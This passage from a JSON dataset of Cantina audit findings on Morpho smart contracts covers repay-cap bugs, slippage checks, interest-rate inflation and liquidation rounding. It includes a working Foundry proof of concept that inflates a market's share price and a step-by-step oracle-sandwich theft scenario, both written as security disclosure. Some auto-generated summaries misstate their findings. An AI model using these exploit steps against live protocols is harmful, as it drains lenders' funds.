`withdraw` and almost all other functions always perform a market accrual first.\n\nThe likelihood is high because the max borrow rate can be reached by any IRM using the adaptive rebasing mechanism. Also, IRM borrow rates are supposed to be in range of not reverting by this code and not checked by a human when whitelisting. \n\nThe impact is high as all user funds in the pool will be locked due to the revert during accruing interest.\n\n## Recommendation\nConsider using the correct APY values mentioned above.",
      "summary": "\nThe bug report states that there is an issue with the interest rate calculation in the ConstantsLib.sol file. The current value for MAX_RATE_AT_TARGET, which is used to calculate the annual percentage rate (APR), is incorrect and would result in an extremely high APY of 1e7%. This would cause problems with the Morpho Blue function, which compounds interest, and could lead to the market becoming dysfunctional. The report recommends using the correct APY values to avoid this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel",
        "darkbit"
      ]
    },
    {
      "id": "40864",
      "title": "Cannot use uint256.max to repay the balance of compoundv2migrationbundler ",
      "impact": "MEDIUM",
      "content": "## Context: CompoundV2MigrationBundler.sol#L40\n\n## Description\nThe `compoundV2Repay`'s natspec states the following for the `amount` parameter:  \n*The amount of cToken to repay. Pass `type(uint256).max` to repay all (except for cETH).*\n\nIt's ambiguous what \"all\" refers to: the bundler's token balance or the borrow balance. We assume the bundler's balance, as that's the approach taken by the other bundlers. Passing `type(uint256).max` to repay the bundler's cToken balance does not work. Note that if `amount == type(uint256).max`, this value is not adjusted and just forwarded to the `ICToken(cToken).repayBorrowBehalf` call.\n\nCompoundV2 will execute this code:\n\n```solidity\n/* We fetch the amount the borrower owes, with accumulated interest */\nuint accountBorrowsPrev = borrowBalanceStoredInternal(borrower);\n\n/* If repayAmount == -1, repayAmount = accountBorrows */\nuint repayAmountFinal = repayAmount == type(uint).max ? accountBorrowsPrev : repayAmount;\n```\n\nThis caps the amount to be repaid to the entire borrow balance, not to the bundler's balance. The call will revert as it tries to repay the entire borrow balance with the bundler's balance.\n\n## Example\nA user tries to migrate part of their position by trying to repay half of their borrow balance of 1000 assets. The first action in the bundle redeems shares from another protocol to receive the desired repay amount of roughly 500 assets, and the second action is to repay by setting `assets = type(uint256).max` to \"repay the bundler's asset balance,\" as defined by the natspec. The batch will revert as Aave V2 will try to repay the entire borrow balance of 1000 but the bundler only has 500 assets.\n\n## Recommendation\nConsider always capping the amount to the bundler's balance. Trying to repay more will never work, and the protocol itself will already cap it to the entire borrow balance:\n\n```solidity\nif (amount != type(uint256).max) \n    amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));\n```\n\n```solidity\namount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));\n```",
      "summary": "\nThe bug report discusses an issue with the CompoundV2MigrationBundler contract. The contract's natspec for the compoundV2Repay function is unclear about the amount parameter, specifically what \"all\" refers to. This has led to confusion and errors when trying to use the function. The code also has a bug where it tries to repay the entire borrow balance instead of the bundler's balance, causing the transaction to fail. The recommendation is to always cap the amount to the bundler's balance to avoid this issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel"
      ]
    },
    {
      "id": "40863",
      "title": "Cannot use uint256.max to repay the balance of aavev3optimizermigrationbundler ",
      "impact": "MEDIUM",
      "content": "## AaveV3OptimizerMigrationBundler.sol #L37\n\n## Description\nThe `aaveV3OptimizerRepay`'s natspec states the following for the amount parameter:\n\n> The amount of underlying to repay. Pass `type(uint256).max` to repay the bundler's underlying.\n\nPassing `type(uint256).max` to repay the bundler's underlying balance does not work. Note that if `amount == type(uint256).max`, this value is not adjusted and just forwarded to the `AAVE_V3_OPTIMIZER.repay` call.\n\nThe `AaveV3Optimizer` will forward the calls to Morpho's `PositionManager`, which executes:\n\n```solidity\n// AaveV3Optimizer\nfunction _repay(address underlying, uint256 amount, address from, address onBehalf) internal returns (uint256) {\n    bytes memory returnData = _positionsManager.functionDelegateCall(\n        abi.encodeCall(IPositionsManager.repayLogic, (underlying, amount, from, onBehalf))\n    );\n    return (abi.decode(returnData, (uint256)));\n}\n```\n\n```solidity\n// PositionManager\nfunction repayLogic(address underlying, uint256 amount, address repayer, address onBehalf) external returns (uint256) {\n    amount = Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount);\n}\n```\n\nThis caps the amount to be repaid to the entire borrow balance, not to the bundler's balance. The call will revert as it tries to repay the entire borrow balance with the bundler's balance.\n\n## Example\nA user tries to migrate part of their position by attempting to repay half of their borrow balance of 1000 assets. The first action in the bundle redeems shares from another protocol to receive the desired repay amount of roughly 500 assets, and the second action is to repay by setting `assets = type(uint256).max` to \"repay the bundler's asset balance,\" as defined by the natspec. The batch will revert as `AaveV3Optimizer` will try to repay the entire borrow balance of 1000, but the bundler only has 500 assets.\n\n## Recommendation\nConsider always capping the amount to the bundler's balance. Trying to repay more will never work, and the protocol itself will already cap it to the entire borrow balance:\n\n```solidity\nif (amount != type(uint256).max) \n    amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));\n```\n\n```solidity\namount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));\n```",
      "summary": "\nThe bug report is about an issue with the AaveV3OptimizerMigrationBundler contract. The problem is that when trying to repay the bundler's underlying balance by passing the maximum value, it does not work. This is because the code caps the amount to be repaid to the entire borrow balance, not just the bundler's balance. This means that if a user tries to migrate part of their position by repaying half of their borrow balance, the batch will fail because the bundler only has half of the assets. The recommendation is to always cap the amount to the bundler's balance to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel",
        "J4X98"
      ]
    },
    {
      "id": "40862",
      "title": "Cannot use uint256.max to repay the balance of aavev3migrationbundler ",
      "impact": "MEDIUM",
      "content": "## AaveV3 Migration Bundler Issue Documentation\n\n## Context\nAaveV3MigrationBundler.sol#L37\n\n## Description\nThe `aaveV3Repay`'s natspec states the following for the amount parameter:  \n*The amount of asset to repay. Pass `type(uint256).max` to repay the bundler's asset balance.*  \n\nHowever, passing `type(uint256).max` to repay the bundler's asset balance does not work. Note that if `amount == type(uint256).max`, this value is not adjusted and just forwarded to the `AAVE_V3_POOL.repay` call.\n\nAaveV3 will execute this code:\n\n```solidity\nuint256 paybackAmount = params.interestRateMode == DataTypes.InterestRateMode.STABLE\n? stableDebt\n: variableDebt;\n// note that useATokens is false for repay and this is not executed\nif (params.useATokens && params.amount == type(uint256).max) {\n    params.amount = IAToken(reserveCache.aTokenAddress).balanceOf(msg.sender);\n}\n// not executed either as params.amount = type(uint256).max\n// meaning paybackAmount will stay at entire `variableDebt`\nif (params.amount < paybackAmount) {\n    paybackAmount = params.amount;\n}\n```\n\nNote that `useATokens` is false for repays. This caps the amount to be repaid to the entire borrow balance, not to the bundler's balance. The call will revert as it tries to repay the entire borrow balance with the bundler's balance.\n\n### Example\nA user tries to migrate part of their position by trying to repay half of their borrow balance of 1000 assets. The first action in the bundle redeems shares from another protocol to receive the desired repay amount of roughly 500 assets, and the second action is to repay by setting `assets = type(uint256).max` to \"repay the bundler's asset balance,\" as defined by the natspec. The batch will revert as Aave V3 will try to repay the entire borrow balance of 1000, but the bundler only has 500 assets.\n\n## Recommendation\nConsider always capping the amount to the bundler's balance. Trying to repay more will never work, and the protocol itself will already cap it to the entire borrow balance:\n\n```solidity\n- if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));\n+ amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));\n```",
      "summary": "\nThis bug report discusses an issue with the AaveV3MigrationBundler contract. It states that passing the maximum value for the \"amount\" parameter in the aaveV3Repay function does not work as intended. The report explains that this causes the bundler to try and repay the entire borrow balance instead of just the bundler's balance. The report recommends capping the amount to the bundler's balance to avoid this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel",
        "J4X98"
      ]
    },
    {
      "id": "40861",
      "title": "Cannot use uint256.max to repay the balance of aavev2migrationbundler ",
      "impact": "MEDIUM",
      "content": "## AaveV2MigrationBundler.sol#L40\n\n## Description\nThe `aaveV2Repay`'s natspec states the following for the `amount` parameter:\n\n> The amount of asset to repay. Pass `type(uint256).max` to repay the bundler's asset balance.\n\nPassing `type(uint256).max` to repay the bundler's asset balance does not work. Note that if `amount == type(uint256).max`, this value is not adjusted and just forwarded to the `AAVE_V2_POOL.repay` call.\n\nAave will execute the following code:\n\n```solidity\nuint256 paybackAmount = \n    interestRateMode == DataTypes.InterestRateMode.STABLE ? stableDebt : variableDebt;\n// not executed as params.amount = type(uint256).max\n// meaning paybackAmount will stay at entire `variableDebt`\nif (amount < paybackAmount) {\n    paybackAmount = amount;\n}\n```\n\nThis caps the amount to be repaid to the entire borrow balance, not to the bundler's balance. The call will revert as it tries to repay the entire borrow balance with the bundler's balance.\n\n## Example\nA user tries to migrate part of their position by attempting to repay half of their borrow balance of 1000 assets. The first action in the bundle redeems shares from another protocol to receive the desired repay amount of roughly 500 assets, and the second action is to repay by setting `assets = type(uint256).max` to \"repay the bundler's asset balance,\" as defined by the natspec. The batch will revert as Aave V2 will try to repay the entire borrow balance of 1000, but the bundler only has 500 assets.\n\n## Recommendation\nConsider always capping the amount to the bundler's balance. Trying to repay more will never work, and the protocol itself will already cap it to the entire borrow balance:\n\n```solidity\n// if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));\namount = Math.min(amount, ERC20(asset).balanceOf(address(this)));\n```",
      "summary": "\nSummary:\n\nThe bug report discusses an issue with the AaveV2MigrationBundler contract where passing type(uint256).max as the amount parameter in the aaveV2Repay function does not work as intended. This results in the entire borrow balance being repaid instead of just the bundler's balance. The report suggests capping the amount to the bundler's balance to avoid this issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel",
        "J4X98"
      ]
    },
    {
      "id": "40860",
      "title": "Broken slippage check in erc4626.erc4626mint ",
      "impact": "MEDIUM",
      "content": "## ERC4626Bundler.sol Analysis\n\n## Context\n- **File**: ERC4626Bundler.sol\n- **Line**: 36\n\n## Description\nA user specifies shares and a `maxAssets` slippage parameter for the `erc4626Mint` function. However, the slippage parameter is not directly applied to the `shares` parameter; it is applied to the smaller shares value of:\n\n```solidity\nshares = Math.min(shares, IERC4626(vault).maxMint(receiver));\n```\n\nThis leads to the user potentially accepting a worse share price for the mint than they specified in the function.\n\n## Example\nA user wants to mint 1000 shares at a share price of 1.0 and specifies:\n- `shares = 1000`\n- `maxAssets = 1000`\n\nImagine `maxMint` returning only 1 share and the share price suddenly being 1000.0. The user now pays 1000 assets for a single share and the slippage check still passes.\n\n## Recommendation\n- Revert if the `shares` are less than `maxMint`, or \n- Adjust the `maxAssets` proportional to `maxMint / initialDesiredShares` to enforce the same share price.",
      "summary": "\nBug Summary: The ERC4626Bundler.sol#L36 function is not correctly applying the slippage parameter to the shares parameter, potentially resulting in users paying a higher share price than intended.\n\nExplanation: When a user specifies shares and a maxAssets slippage parameter for the erc4626Mint function, the slippage parameter is not directly applied to the shares parameter. Instead, it is applied to the smaller value between the specified shares and the maximum mintable shares determined by the vault. This can lead to users paying a worse share price than intended.\n\nExample: If a user wants to mint 1000 shares at a share price of 1.0 and specifies shares = 1000 and maxAssets = 1000, but the vault only allows for 1 share to be minted, the share price suddenly becomes 1000.0. This means the user would pay 1000 assets for a single share, even though they intended to pay 1 asset per share.\n\nRecommendation: To fix this issue, the code should be adjusted to either revert the transaction if the specified shares are less than the maximum mintable shares, or to adjust the maxAssets parameter proportionally to the maximum mintable shares divided by the initial desired shares. This will ensure that the intended share price is enforced.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel",
        "T1MOH"
      ]
    },
    {
      "id": "40859",
      "title": "Missing important check if repay and redeem functions in compoundv2migrationbundler.sol are successful ",
      "impact": "MEDIUM",
      "content": "## Context\n(No context files were provided by the reviewer)\n\n## Description\nIn `CompoundV2MigrationBundler.sol`, we have `compoundV2Repay()` and `compoundV2Redeem()`:\n\n```solidity\nfunction compoundV2Repay(address cToken, uint256 amount) external payable protected {\n    if (cToken == C_ETH) {\n        amount = Math.min(amount, address(this).balance);\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n        ICEth(C_ETH).repayBorrowBehalf{value: amount}(initiator());\n    } else {\n        address underlying = ICToken(cToken).underlying();\n        if (amount != type(uint256).max) \n            amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n        _approveMaxTo(underlying, cToken);\n        ICToken(cToken).repayBorrowBehalf(initiator(), amount);\n    }\n}\n\nfunction compoundV2Redeem(address cToken, uint256 amount) external payable protected {\n    amount = Math.min(amount, ERC20(cToken).balanceOf(address(this)));\n    require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n    ICToken(cToken).redeem(amount); //@audit - not check return value\n}\n```\n\n- **`compoundV2Repay()`**: Repays a borrow position on Compound V2.\n- **`compoundV2Redeem()`**: Redeems assets from a cToken position on Compound V2. It calculates the redeemable amount based on the bundler's cToken balance and then calls the redeem function of the cToken contract.\n\n## Problem\nThe problem here is that `compoundV2Repay()` calls `repayBorrowBehalf` and `compoundV2Redeem()` calls `redeem()`. These functions will not rollback the transaction on failure but return 0 or an error code. You can see the docs for `repayBorrowBehalf` and `redeem`.\n\nOne small disclaimer is that with `repayBorrowBehalf()` at `C_ETH`, the function will revert if the transaction fails:\n- **RETURN**: No return, reverts on error.\n\n## Recommendation\nYou should always make sure that these functions will not fail without reverting. Therefore, it is mandatory to check the returned value and revert the transaction if unsuccessful.",
      "summary": "\nThis bug report is about two functions in CompoundV2MigrationBundler.sol - compoundV2Repay() and compoundV2Redeem(). These functions are used to repay a borrow position and redeem assets from a cToken position on Compound V2. The problem is that these functions do not properly handle errors and may return 0 or an error code instead of reverting the transaction. This can lead to unexpected behavior and potential losses. The recommendation is to always check the returned value and revert the transaction if it is unsuccessful. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tsvetanovv",
        "Bauchibred",
        "Christoph Michel",
        "T1MOH"
      ]
    },
    {
      "id": "40876",
      "title": "Users can take advantage of low liquidity markets to inate the interest rate ",
      "impact": "MEDIUM",
      "content": "## Morpho Blue Interest Rate Model Issue\n\n## Context\n- Morpho.sol#L471-L476\n- AdaptiveCurveIrm.sol#L117-L120\n- Morpho.sol#L477\n- Morpho.sol#L180-L181\n- SharesMathLib.sol#L15-L21\n\n## Description\nMorpho Blue is intended to function with stateful Interest Rate Models (IRM). Whenever the function `_accrueInterest()` is invoked, it calls the `borrowRate()` of the IRM contract:\n\n```solidity\nfunction _accrueInterest(MarketParams memory marketParams, Id id) internal {\n    uint256 elapsed = block.timestamp - market[id].lastUpdate;\n    if (elapsed == 0) return;\n    uint256 borrowRate = IIrm(marketParams.irm).borrowRate(marketParams, market[id]);\n}\n```\n\nThis mechanism adjusts the market's interest rate based on the current state of the market. For instance, `AdaptiveCurveIrm.sol` alters the interest rate according to the market's current utilization rate:\n\n```solidity\nfunction _borrowRate(Id id, Market memory market) private view returns (uint256, int256) {\n    // Safe \"unchecked\" cast because the utilization is smaller than 1 (scaled by WAD).\n    int256 utilization =\n        int256(market.totalSupplyAssets > 0 ? market.totalBorrowAssets.wDivDown(market.totalSupplyAssets) : 0);\n}\n```\n\nHowever, this stateful implementation will always invoke `borrowRate()` and adjust the interest rate, even when it is unnecessary.\n\n### Example of Exploit\nIn `AdaptiveCurveIrm.sol`, an attacker can manipulate the market's utilization rate using the following steps:\n1. Create a market using a legitimate `loanToken`, `collateralToken`, oracle, and the IRM as `AdaptiveCurveIrm.sol`.\n2. Call `supply()` to deposit 1 wei of `loanToken` into the market.\n3. Call `supplyCollateral()` to obtain some collateral.\n4. Call `borrow()` to borrow the 1 wei of `loanToken`.\n5. At this point, the market's utilization rate is 100%.\n6. If no additional `loanToken` is supplied for a prolonged period, `AdaptiveCurveIrm.sol` will aggressively increase the market's interest rate.\n\nThis situation is problematic because Morpho Blue's interest compounds based on the formula:\n\n```solidity\nuint256 interest = market[id].totalBorrowAssets.wMulDown(borrowRate.wTaylorCompounded(elapsed));\n```\n\nAs the `borrowRate` (the interest rate) increases, interest accrues at an exponential rate, potentially causing the market's `totalSupplyAssets` and `totalBorrowAssets` to balloon excessively.\n\n### Issues Arising from the Exploit\n1. **Un-clearable Bad Debt**: \n   - Should a large amount of interest accrue, `totalBorrowAssets` will be tremendously inflated, despite `totalBorrowShares` being only 1e6 shares. Half of `totalBorrowAssets` would have actually accrued to the other 1e6 virtual shares. After liquidating the attacker's 1e6 shares, half of `totalBorrowAssets` will still persist in the market as un-clearable bad debt.\n\n2. **Permanently Elevated Interest Rates**:\n   - As indicated above, `AdaptiveCurveIrm.sol` raises the market's interest rate while there is merely 1 wei supplied and borrowed, driving the utilization to 100%. If other lenders decide to supply `loanToken` to the market, borrowers would remain dissuaded from borrowing for an extended period, as `AdaptiveCurveIrm.sol` would need to adjust the market's interest rate downward.\n\n3. **Loss of Funds for Small Asset Depositors**:\n   - If `totalSupplyAssets` is significantly larger than `totalSupplyShares`, the market's shares-to-assets ratio will become inflated. Consequently, the share calculation in `supply()` may round down to 0:\n\n```solidity\nif (assets > 0) \n    shares = assets.toSharesDown(market[id].totalSupplyAssets, market[id].totalSupplyShares);\nelse \n    assets = shares.toAssetsUp(market[id].totalSupplyAssets, market[id].totalSupplyShares);\n```\n\nIn this case, users would end up receiving 0 shares when depositing assets, leading to a loss of funds.\n\n### Proof of Concept\nThe following proof of concept illustrates how the market's interest rate can be inflated as previously described. Note that this PoC should be placed in the `morpho-blue-irm` repository.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"lib/forge-std/src/Test.sol\";\nimport \"src/AdaptiveCurveIrm.sol\";\nimport {BaseTest} from \"lib/morpho-blue/test/forge/BaseTest.sol\";\n\ncontract CreamyInflationAttack is BaseTest {\n    using MarketParamsLib for MarketParams;\n\n    int256 constant CURVE_STEEPNESS = 4 ether;\n    int256 constant ADJUSTMENT_SPEED = int256(20 ether) / 365 days;\n    int256 constant TARGET_UTILIZATION = 0.9 ether; // 90%\n    int256 constant INITIAL_RATE_AT_TARGET = int256(0.1 ether) / 365 days; // 10% APR\n\n    function setUp() public override {\n        super.setUp();\n        // Deploy and enable AdaptiveCurveIrm\n        AdaptiveCurveIrm irm = new AdaptiveCurveIrm(\n            address(morpho), CURVE_STEEPNESS, ADJUSTMENT_SPEED, TARGET_UTILIZATION, INITIAL_RATE_AT_TARGET\n        );\n\n        vm.prank(OWNER);\n        morpho.enableIrm(address(irm));\n\n        // Deploy market with AdaptiveCurveIrm\n        marketParams = MarketParams({\n            loanToken: address(loanToken), // Pretend this is USDC\n            collateralToken: address(collateralToken), // Pretend this is USDT\n            oracle: address(oracle),\n            irm: address(irm),\n            lltv: DEFAULT_TEST_LLTV\n        });\n\n        id = marketParams.id();\n        morpho.createMarket(marketParams);\n    }\n\n    function testInflateInterestRateWhenLowLiquidity() public {\n        // Supply and borrow 1 wei\n        _supply(1);\n        collateralToken.setBalance(address(this), 2);\n        morpho.supplyCollateral(marketParams, 2, address(this), \"\");\n        morpho.borrow(marketParams, 1, 0, address(this), address(this));\n\n        // Accrue interest for 150 days\n        for (uint i = 0; i < 150; i++) {\n            skip(1 days);\n            morpho.accrueInterest(marketParams);\n        }\n\n        // Liquidating only divides assets by 2, the other half accrues to virtual shares\n        loanToken.setBalance(address(this), 2);\n        morpho.liquidate(marketParams, address(this), 2, 0, \"\");\n\n        // Shares to assets ratio is now extremely high\n        console2.log(\"supplyAssets: %d, supplyShares: %d\", morpho.market(id).totalSupplyAssets,\n            morpho.market(id).totalSupplyShares);\n        console2.log(\"borrowAssets: %d, borrowShares: %d\", morpho.market(id).totalBorrowAssets,\n            morpho.market(id).totalBorrowShares);\n\n        // Supply 1M USDC but receives no shares in return\n        loanToken.setBalance(address(this), 1_000_000e6);\n        morpho.supply(marketParams, 1_000_000e6, 0, SUPPLIER, \"\");\n        assertEq(morpho.position(id, SUPPLIER).supplyShares, 0);\n    }\n}\n```\n\n## Recommendation\nIn `_accrueInterest()`, consider implementing a check to ensure that `totalSupplyAssets` is sufficiently large before calling `IIrm.borrowRate()`. This would prevent the IRM from adjusting the interest rate when the utilization rate is \"falsely\" high (e.g., only 1 wei supplied and borrowed, resulting in a 100% utilization rate).",
      "summary": "\nThis report discusses a bug found in the Morpho Blue smart contract, specifically in the functions related to stateful Interest Rate Models (IRM). The bug causes the interest rate to be adjusted even when it should not be, leading to several issues such as a huge amount of un-clearable debt, a permanently high interest rate, and potential loss of funds for users. The report also includes a proof of concept for the bug. The recommendation is to check for sufficient assets before calling the IRM function to prevent the interest rate from being falsely adjusted. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "MiloTruck"
      ]
    },
    {
      "id": "40875",
      "title": "Any oracle update with suciently big price decline can be sandwiched to extract value from the protocol ",
      "impact": "MEDIUM",
      "content": "## Context\n\n**Morpho.sol#L364-L377**  \nDescription: Whenever oracle updates provide a substantial enough price decline, the fixed nature of liquidation incentive along with the fixed LLTV for the market creates the potential to artificially generate bad debt and immediately liquidate it, effectively stealing from protocol depositors.\n\n## Code Snippet\n\n```solidity\n// Morpho.sol#L344-L378\nfunction liquidate(\n    // ...\n) external returns (uint256, uint256) {\n    // ...\n    // see the line below\n    uint256 collateralPrice = IOracle(marketParams.oracle).price();\n    // see the line below\n    require(!_isHealthy(marketParams, id, borrower, collateralPrice), ErrorsLib.HEALTHY_POSITION);\n    uint256 repaidAssets;\n    {\n        // The liquidation incentive factor is min(maxLiquidationIncentiveFactor, 1/(1 - cursor*(1 - lltv))).\n        uint256 liquidationIncentiveFactor = UtilsLib.min(\n            MAX_LIQUIDATION_INCENTIVE_FACTOR,\n            // see the line below\n            WAD.wDivDown(WAD - LIQUIDATION_CURSOR.wMulDown(WAD - marketParams.lltv))\n        );\n        if (seizedAssets > 0) {\n            repaidAssets =\n                seizedAssets.mulDivUp(collateralPrice, ORACLE_PRICE_SCALE).wDivUp(liquidationIncentiveFactor);\n            // ...\n        } else {\n            // ...\n            seizedAssets =\n                repaidAssets.wMulDown(liquidationIncentiveFactor).mulDivDown(ORACLE_PRICE_SCALE, collateralPrice); \n        }\n    }\n    // ...\n}\n\n// Morpho.sol#L387-L398\nif (position[id][borrower].collateral == 0) {\n    // ...\n    position[id][borrower].borrowShares = 0;\n}\n```\n\n## Problematic Behavior\n\nFor highly volatile collateral, it is possible to sandwich the Oracle update transaction (tx2) by creating a minimum collateralized loan before (tx1) and liquidating it right after, withdrawing all the collateral (tx3). As liquidation pays the fixed incentive and socializes the resulting bad debt, if any, in cases where bad debt can be created on exactly one Oracle update (i.e., whenever it is sufficiently volatile with respect to LLTV), this behavior can be exploited. The attacker will pocket the difference between debt and collateral valuation, fully receiving it via the liquidate-withdraw collateral sequence in tx3.\n\nNotice that the initial LLTV setting might be appropriate for the collateral volatility at that moment, but if a particular collateral/asset pair becomes substantially more volatile (due to developments in collateral, asset, or overall market state), there is no way to prohibit the use of LLTV once enabled.\n\n## Proof of Concept\n\n- A Morpho instance for stablecoins was launched with USDC collateral and USDT asset allowed, with LLTV set at a competitive reading of 95%. Over time, it gained TVL, and USDC and USDT are now traded 1:1. The liquidation incentive factor for the market is calculated as:\n\n  \\[\n  \\text{liquidationIncentiveFactor} = \\frac{1.0}{1 - 0.3 \\times (1 - 0.95)} = 1.01522.\n  \\]\n\n- There was a shift in the USDC reserves valuation approach, and updated reserves figures were sharply priced via a new Oracle reading of 0.9136 USDT per USDC.\n\n- Bob, the attacker, front runs the Oracle update transaction (tx2) by borrowing USDT 0.95m after providing USDC 1m (tx1). For simplicity, we ignore minor adjustments in the numbers where they might be needed as they do not affect the overall picture.\n\n- Bob back-runs tx2 with the liquidation of his own loan (tx3), repaying USDT 0.9m of the USDT 0.95m debt. Since the price was updated, with `repaidAssets = USDT 0.9m`, he will have `seizedAssets = \\frac{USDC 0.9m \\times 1.01522}{0.9136} = USDC 1m`.\n\n- Bob regained all the collateral and pocketed USDT 0.05m, which was written off as bad debt.\n\nThus, an attacker can steal principal funds from the protocol by artificially creating bad debt. This represents a permanent loss for market lenders, with the severity estimated to be high.\n\nThe probability of this occurring is medium, as collateral volatility is not fixed, and sharp downside movements will occur intermittently across various markets. The prerequisite is that the initially chosen LLTV does not guarantee the absence of bad debt following one Oracle update. This means that LLTV has to be updated to a lower value, but as it is fixed within the market, such changes are often subtle enough. Once this happens, there is a substantial probability that there will be a window of opportunity for attackers during the period when the LLTV of a significant market becomes outdated and excessively high, coupled with a lack of communication about it while the market is actively used.\n\n## Recommendation\n\nConsider introducing a liquidation penalty for borrowers, going toward fees. The goal here is not to increase fees, and it is recommended that interest-based fees should be lowered simultaneously. This is intended to disincentivize careless borrowing and make self-liquidation a negative-sum game. \n\nAlso, consider monitoring changes in collateral volatilities and flagging markets whose initially chosen LLTV has become insufficiently conservative, keeping lenders informed of the evolving risks.",
      "summary": "\nThis bug report discusses a potential issue in the Morpho.sol code, where an attacker can exploit the fixed nature of the liquidation incentive and the loan-to-value ratio (LLTV) to create bad debt and steal funds from the protocol depositors. This can happen when there is a substantial decline in the price of the collateral, allowing the attacker to artificially create a loan and immediately liquidate it, pocketing the difference between the debt and collateral valuation. This can happen in markets with highly volatile collateral, and there is no way to prevent it once the LLTV is enabled. The report suggests introducing a liquidation penalty for borrowers and monitoring changes in collateral volatility to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hyh",
        "Said"
      ]
    },
    {
      "id": "40874",
      "title": "Liquidation repaidshares computation rounding issue ",
      "impact": "MEDIUM",
      "content": "## Context\n(No context files were provided by the reviewer)\n\n## Description\nCurrently, liquidations can end up with the borrower having a less healthy position than before the liquidation (even without liquidation incentive and favorable LLTV). Note that the borrower position is measured in shares (not assets) via `position[id][borrower].borrowShares`. The `repaidShares` are rounded down from the seized-assets-converted repaid assets value. \n\nFor illustration, `repaidShares` could even be 0 if the share price (`totalBorrowAssets / totalBorrowShares`) is above 1.0. (This can happen as the IRM allows borrow rates up to a billion % APR per year and the initial start price is just 1e-6 = 0.000001 or through other ways, see existing issue about inflating borrow share price mentioned in Cantina audit.) \n\nThe borrower's borrow debt position would not be repaid as `repaidShares = 0` but the liquidator still seizes `seizedAssets` of the borrower's collateral. The borrower's health factor only gets worse.\n\nThe impact is that an unhealthy borrower's position can be fully liquidated by splitting up liquidations into tiny liquidations (each repaying zero shares but seizing the full rounded-up repay amount of collateral) while not reducing their actual asset debt position. The protocol will incur the entire initial borrow debt assets as bad debt.\n\n## Recommendation\nWhile the computed `repaidAssets` and `repaidShares` are correct for the repay part of the liquidation, the code also needs to ensure that the value of the `seizedAssets` is not greater than the value of the final `repaidShares`. In the case where the liquidator provides a fixed `seizedAssets` parameter amount, it's not straightforward. A potential solution could be to readjust `repaidAssets`.\n\n```solidity\nif (seizedAssets > 0) {\n    repaidAssets = seizedAssets.mulDivUp(collateralPrice, ORACLE_PRICE_SCALE).wDivUp(liquidationIncentiveFactor);\n    // round up to ensure seizedAssets < repaidShares value\n    repaidShares = repaidAssets.toSharesUp(market[id].totalBorrowAssets, market[id].totalBorrowShares);\n    // imitate a repay of repaidShares\n    repaidAssets = repaidShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares);\n}\n```",
      "summary": "\nThe liquidation process in the protocol can result in borrowers having a worse position than before, even without any incentives or favorable loan-to-value ratios. This is because the borrower's position is measured in shares, not assets, and the rounded down value of repaid shares can sometimes be 0 if the share price is high. This can lead to the borrower's debt not being fully repaid while the liquidator still seizes their collateral, causing the borrower's health factor to worsen. This can also result in the protocol incurring bad debt. The recommended solution is to ensure that the value of seized assets is not greater than the value of repaid shares.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf",
      "github_link": "",
      "tags": [],
